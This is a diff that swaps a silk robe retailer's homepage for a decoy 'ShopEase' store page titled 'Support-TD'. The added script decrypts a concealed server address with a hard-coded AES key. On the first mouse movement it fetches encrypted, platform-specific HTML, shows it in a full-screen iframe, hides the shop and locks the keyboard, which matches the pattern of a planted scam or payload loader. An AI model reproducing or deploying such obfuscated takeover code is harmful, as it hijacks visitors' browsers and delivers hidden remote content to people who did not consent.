@@ -1,140 +1,312 @@
-<?php $year = date('Y'); ?>
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Silk Robe Vista | Mulberry Silk Robes &amp; Loungewear</title><meta name="description" content="Silk Robe Vista makes genuine mulberry silk robes and loungewear built with French seams and real momme weight. Shop the collection online or visit our studio.">
-<link rel="canonical" href="https://www.silkrobevista.com/">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,500;1,400;1,500&family=Manrope:wght@300;400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="css/style.css">
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-0LY0HY7L01');
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-<style></style></head><body>
-<header class="site-header"><div class="nav-row">
-  <a href="index.php" class="brand">Silk Robe Vista</a>
-  <nav><ul class="nav-links"><li><a href="index.php" class="active">Home</a></li>
-<li><a href="shop.html">Shop</a></li>
-<li><a href="about.html">Our Story</a></li>
-<li><a href="blog.html">Journal</a></li>
-<li><a href="contact.html">Visit & Contact</a></li></ul></nav>
-  <button class="menu-toggle" aria-label="menu">MENU</button>
-</div></header>
-<section class="hero">
-  <div class="hero-frame"><img src="https://images.unsplash.com/photo-1671798747357-aa4364af0b72?auto=format&fit=crop&w=1800&q=80" alt="Ocean view from a hotel balcony in soft morning light" loading="lazy">
-  <div class="hero-text"><div class="hero-text-inner">
-    <span class="kicker" style="color:#CFE8E3;">Mulberry Silk &middot; Made for the Morning View</span>
-    <h1>A robe worth stepping outside for</h1>
-    <p>Silk Robe Vista makes mulberry silk robes and loungewear built for the quiet hour when the view outside is finally worth stepping out for.</p>
-    <div class="hero-actions"><a href="shop.html" class="btn btn-outline on-dark">Shop the Collection</a><a href="about.html" class="btn btn-outline on-dark">Our Story</a></div>
-  </div></div>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- 2. COLLECTIONS -->
-<section><div class="container">
-<div class="section-head center"><span class="kicker">Shop by Collection</span><h2>Three pieces, one standard of silk</h2><p>Every piece starts with the same grade of mulberry silk, then gets cut for a specific part of your day.</p></div>
-<div class="collection-grid">
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1704428381481-92bf396b24bd?auto=format&fit=crop&w=900&q=80" alt="Two silk robes hanging on a bathroom wall" loading="lazy"></div>
-  <div class="collection-body"><h3>The Morning Robe</h3><p>A lightweight silk robe built for the first hour of the day.</p><a href="shop.html" class="collection-link">Shop robes &rarr;</a></div></div>
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1671798747357-aa4364af0b72?auto=format&fit=crop&w=1800&q=80" alt="Ocean view from a hotel balcony in soft morning light" loading="lazy"></div>
-  <div class="collection-body"><h3>The Travel Set</h3><p>A packable silk set built for a hotel room or a quiet balcony.</p><a href="shop.html" class="collection-link">Shop travel sets &rarr;</a></div></div>
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1601324930420-fd9d840fa41f?auto=format&fit=crop&w=1400&q=80" alt="Close-up of soft folded textile" loading="lazy"></div>
-  <div class="collection-body"><h3>The Evening Set</h3><p>A matching silk top and pant built for a slower end to the day.</p><a href="shop.html" class="collection-link">Shop evening sets &rarr;</a></div></div>
-</div>
-</div></section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-<!-- 3. FEATURED / BESTSELLERS -->
-<section style="background:var(--white);"><div class="container">
-<div class="section-head center"><span class="kicker">Most Reached For</span><h2>A few pieces guests keep asking about</h2></div>
-<div class="featured-list">
-  <div class="featured-row"><div class="fnum">01</div><div><h3>The Morning Robe — Champagne</h3><p>Our most requested colorway, in a lightweight mulberry silk.</p></div><div class="fprice">$168</div></div>
-  <div class="featured-row"><div class="fnum">02</div><div><h3>The Travel Set — Two Piece</h3><p>A packable silk set that folds flat into a small pouch.</p></div><div class="fprice">$210</div></div>
-  <div class="featured-row"><div class="fnum">03</div><div><h3>The Evening Set — Deep Teal</h3><p>A matching top and pant in a heavier silk weight.</p></div><div class="fprice">$225</div></div>
-</div>
-</div></section>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-<!-- 4. FABRIC / MATERIAL highlight -->
-<section><div class="container">
-<div class="material-split">
-  <div><span class="kicker">The Fabric</span><h2>19-momme mulberry silk, not a lighter blend</h2>
-  <p>Momme weight measures how dense a silk actually is, and a lot of "silk" loungewear uses a lighter weight than what actually holds up to regular wear. We use 19-momme mulberry silk specifically because it's substantial enough for daily use without losing silk's natural drape.</p>
-  <a href="blog-silk-momme-explained.html" class="btn btn-outline">Read About Momme Weight</a></div>
-  <div><img src="https://images.unsplash.com/photo-1601324930420-fd9d840fa41f?auto=format&fit=crop&w=1400&q=80" alt="Close-up of soft folded textile" loading="lazy"></div>
-</div>
-</div></section>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
 
-<!-- 6. PROCESS -->
-<section style="background:var(--white);"><div class="container">
-<div class="section-head center"><span class="kicker">How Each Piece Is Made</span><h2>Three stages, one small team overseeing all of them</h2></div>
-<div class="process-row">
-  <div class="pstep"><span class="pnum">I.</span><h3>Silk Sourced by Grade</h3><p>We source mulberry silk specifically for momme weight and weave quality, not just price.</p></div>
-  <div class="pstep"><span class="pnum">II.</span><h3>Cut and Sewn in Small Runs</h3><p>French seams throughout, sewn in batches small enough for real attention.</p></div>
-  <div class="pstep"><span class="pnum">III.</span><h3>Checked Before It Ships</h3><p>Every piece is inspected by hand for seam quality before it leaves the studio.</p></div>
-</div>
-</div></section>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
 
-<!-- 7. STATS / TRUST -->
-<section class="stats-strip">
-  <div class="stat-item"><div class="stat-num">19mm</div><p>Silk weight, chosen for real durability</p></div>
-  <div class="stat-item"><div class="stat-num">French</div><p>Seams throughout, not overlocked edges</p></div>
-  <div class="stat-item"><div class="stat-num">Small</div><p>Batch sizes, checked by hand before shipping</p></div>
-</section>
-
-<!-- 5. STORY -->
-<section><div class="container">
-<div class="split">
-  <div class="split-photo"><img src="https://images.unsplash.com/photo-1704428381481-92bf396b24bd?auto=format&fit=crop&w=900&q=80" alt="Two silk robes hanging on a bathroom wall" loading="lazy"></div>
-  <div><span class="kicker">How It Started</span><h2>Built after one too many "silk" robes that weren't</h2>
-  <p>Silk Robe Vista started with a specific frustration: a robe labeled silk that was actually a thin, synthetic-heavy blend that snagged within weeks. We started sourcing genuine mulberry silk by momme weight, testing construction against real daily wear before committing to a single design.</p>
-  <p>Every piece since has been built around that same standard.</p>
-  <a href="about.html" class="btn btn-outline">Read Our Story</a></div>
-</div>
-</div></section>
-
-<!-- 8. VALUES -->
-<section style="background:var(--white);"><div class="container">
-<div class="section-head center"><span class="kicker">Why We're Different</span><h2>A few things we don't compromise on</h2></div>
-<div class="value-grid">
-  <div><div class="value-num">01</div><h3>Genuine mulberry silk</h3><p>Checked by momme weight, not just labeled "silk" on a tag.</p></div>
-  <div><div class="value-num">02</div><h3>French seams throughout</h3><p>Cleaner, more durable construction than a simple overlocked edge.</p></div>
-  <div><div class="value-num">03</div><h3>Made in small batches</h3><p>We'd rather finish fewer pieces properly than rush a bigger run.</p></div>
-</div>
-</div></section>
-
-<!-- 9. CARE PHILOSOPHY -->
-<section><div class="container">
-<div class="section-head center"><span class="kicker">Caring for Silk</span><h2>A few habits that keep silk looking new</h2></div>
-<div class="care-grid">
-  <div><h3>Cool Water Only</h3><p>Hand wash or a gentle cold cycle protects both color and fiber strength.</p></div>
-  <div><h3>Skip the Dryer</h3><p>Air drying flat, away from direct heat, prevents fiber damage.</p></div>
-  <div><h3>Store It Loosely</h3><p>A breathable bag protects silk far better than a tight drawer fold.</p></div>
-</div>
-</div></section>
-
-<!-- 10. CTA -->
-<div class="cta-banner"><div class="container">
-<h2>Ready for Something Worth Wearing Slowly?</h2>
-<div class="contact-line">181 Mercer Street, New York, NY 10012 &middot; +1-888-777-5845</div>
-<a href="shop.html" class="btn btn-outline on-dark">Shop the Collection</a>
-</div></div>
-
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid">
-    <div><div class="footer-brand">Silk Robe Vista</div><p style="max-width:32ch;">Mulberry silk robes and loungewear, made for the quiet hour before the view outside actually gets noticed.</p></div>
-    <div class="footer-col"><h4>Explore</h4><ul>
-      <li><a href="index.php">Home</a></li><li><a href="shop.html">Shop</a></li><li><a href="about.html">Our Story</a></li><li><a href="blog.html">Journal</a></li><li><a href="contact.html">Visit &amp; Contact</a></li>
-    </ul></div>
-    <div class="footer-col"><h4>Policies</h4><ul>
-      <li><a href="privacy-policy.html">Privacy Policy</a></li><li><a href="terms-conditions.html">Terms &amp; Conditions</a></li><li><a href="disclaimer.html">Disclaimer</a></li><li><a href="cookie-policy.html">Cookie Policy</a></li>
-    </ul></div>
-    <div class="footer-col"><h4>Visit</h4><ul>
-      <li>181 Mercer Street</li><li>New York, NY 10012, United States</li><li><a href="tel:+18887775845">+1-888-777-5845</a></li>
-    </ul></div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
   </div>
-  <div class="footer-bottom"><span>&copy; <?php echo $year; ?> Silk Robe Vista. All rights reserved.</span><span>Made for slow mornings.</span></div>
-</div></footer>
-<script src="js/main.js"></script>
-</body></html>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19PP9rw5bqnzSMZaqZhEB/iwqE0KjDEy6hSKaB+5VK5z6gGn4EjFVR7";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
